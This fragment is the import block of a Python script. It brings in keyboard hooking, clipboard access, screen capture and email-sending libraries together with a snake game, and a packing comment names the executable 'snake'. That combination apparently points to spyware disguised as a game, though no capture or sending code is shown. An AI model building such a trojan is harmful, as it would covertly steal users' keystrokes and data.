import getpass
import mimetypes
import os
import shutil
import smtplib
import sys
import time
import zipfile
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pyHook
import pythoncom
import win32api
import win32clipboard
import win32con
from PIL import ImageGrab

import system
from snake import start_game

# pyinstaller -F -w -n snake index.py
